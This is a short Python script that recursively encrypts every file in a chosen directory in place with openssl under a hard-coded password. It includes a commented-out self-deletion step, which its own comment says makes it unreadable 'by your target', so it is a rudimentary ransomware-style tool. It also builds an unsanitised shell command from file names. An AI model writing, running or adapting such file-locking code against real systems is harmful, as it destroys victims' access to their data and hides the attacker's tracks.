#!/usr/bin/env python3 
import sys
import os
import subprocess

#you can remove this and just add the user directory
if len(sys.argv) > 1:
	dir_path = sys.argv[1] #or user directory instead of sys.argv[]
	subprocess.run(["python3", "backup.py", dir_path]) #get all uncrypted files

	#build list of files from selected directory
	file_list=[]
	print("-------Results-------")
	for root,dirs,files in os.walk(dir_path):
		for file in files:
			file_list.append(os.path.join(root, file))

	#encryption of all the files with "test" password (change it and keep it !!!)
	for file in file_list:
		cmd = "openssl enc -aes-256-cbc -iter 10000 -pass pass:'test' -in " + file + " -out file_temp && mv file_temp "+ file
		subprocess.run(cmd, shell=True)
		print("  [+] File encrypted :", file) 

		#delete script file 
		#os.remove(__file__) /// uncomment to be unreadable by your target
else :
	print("Please select a directory to encrypt files")
